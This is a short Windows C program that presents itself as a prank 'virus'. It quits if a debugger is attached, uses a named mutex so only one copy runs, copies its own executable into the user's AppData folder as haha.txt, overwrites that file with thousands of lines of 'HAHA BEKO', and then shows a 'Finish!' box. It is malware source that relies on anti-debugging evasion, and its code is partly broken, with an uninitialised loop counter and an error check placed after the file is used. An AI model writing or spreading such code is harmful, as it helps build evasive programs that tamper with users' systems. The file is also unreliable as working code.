#include <stdio.h>
#include <windows.h>
#include <windef.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

char dirAppD[MAX_PATH];
char mdl[MAX_PATH];
char str[25] = "HAHA BEKO";

void runVirus();

int main(void) {
	AllocConsole();
	HANDLE mxhandle = CreateMutexA(NULL, TRUE, "SVirus");

	if (IsDebuggerPresent() == 1) {    

		return 0; // close Debugger
	}
	if (GetLastError() == ERROR_ALREADY_EXISTS) {

		CloseHandle(mxhandle);
		return 0; // close application

	}

	runVirus();
}

void runVirus() {
	const char* dirapp = getenv("appdata"); 
		GetModuleFileNameA(0, mdl, sizeof(mdl));
		sprintf(dirAppD, "%s\\haha.txt", dirapp);
			CopyFile(mdl, dirAppD, 0);
		
			FILE *fp = fopen(dirAppD, "w");
					for(int i; i <= 15000; i++) {
						fprintf(fp, "%s\n", str);		
					}
			 		if (fp == 0) {
						printf("Sorry! %s\n", strerror(errno));
						exit(EXIT_FAILURE);
					}
			fclose(fp);
			MessageBox(FindWindowA("ConsoleWindowClass", NULL), "Finish!", "Successful", 0x00000000L | 0x00000040L);
}	
